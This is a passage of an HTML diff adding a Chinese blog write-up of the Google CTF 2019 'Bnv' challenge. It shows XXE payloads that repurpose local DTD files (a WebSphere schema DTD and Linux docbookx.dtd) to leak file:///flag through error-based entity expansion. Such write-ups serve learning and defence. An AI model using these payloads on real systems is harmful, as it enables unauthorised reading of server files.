code</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml"></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%local_dtd</span>;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="任何Web应用程序在IBM-WebSphere-Application-Server"><a href="#任何Web应用程序在IBM-WebSphere-Application-Server" class="headerlink" title="任何Web应用程序在IBM WebSphere Application Server"></a>任何Web应用程序在IBM WebSphere Application Server</h3><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;./../../properties/schemas/j2ee/XMLSchema.dtd&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">xs-datatypes</span> <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml"></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">Your DTD code</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml"></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">&#x27;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">simpleType</span> <span class="hljs-string">&quot;a&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">restriction</span> <span class="hljs-string">&quot;b&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">boolean</span> <span class="hljs-string">&quot;(c)&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">URIref</span> <span class="hljs-string">&quot;CDATA&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">XPathExpr</span> <span class="hljs-string">&quot;CDATA&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">QName</span> <span class="hljs-string">&quot;NMTOKEN&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">NCName</span> <span class="hljs-string">&quot;NMTOKEN&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">nonNegativeInteger</span> <span class="hljs-string">&quot;NMTOKEN&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%local_dtd</span>;</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>所以我们这里使用Linux自带的dtd文件。</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamsa</span> <span class="hljs-string">&#x27;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">	&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">	&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">	&amp;#x25;eval;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">	&amp;#x25;error;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">&#x27;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%local_dtd</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<p><img src="/../image/GoogleCTF2019Quals-Bnv-3.png"></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+
+
+
     <div id="comments">
     <script>
         {
@@ -2353,6 +2641,13 @@
     </script>
 </div>
 
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">
@@ -2361,11 +2656,11 @@
 <p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
 
     </div>
-</div>
-<div class="full-toc">
-    <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
+    <div class="full-toc">
+        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
 <a class="" id="rocket" ></a>
 
+    </div>
 </div>
 
 </body>
